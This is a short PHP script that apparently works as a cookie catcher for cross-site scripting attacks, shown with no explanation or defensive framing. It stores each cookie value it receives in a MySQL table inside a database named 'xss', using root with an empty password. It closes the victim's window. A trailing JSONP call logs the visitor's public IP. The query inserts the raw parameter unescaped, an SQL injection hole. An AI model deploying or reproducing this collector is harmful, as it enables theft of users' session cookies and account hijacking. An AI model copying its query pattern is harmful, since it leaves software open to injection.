<?php
$cookie = $_REQUEST['cookie'];
$l = new mysqli("127.0.0.1", "root", "", "xss");
$l->query("INSERT INTO data_cookie (cookie) VALUES ('$cookie')");
$l->close();
echo "Loading...";
echo "<script>window.close()</script>";
?>
<script type="application/javascript">
  function getIP(json) {
    document.write("My public IP address is: ", json.ip);
  }
</script>

<script type="application/javascript" src="http://ipinfo.io/?format=jsonp&callback=getIP"></script>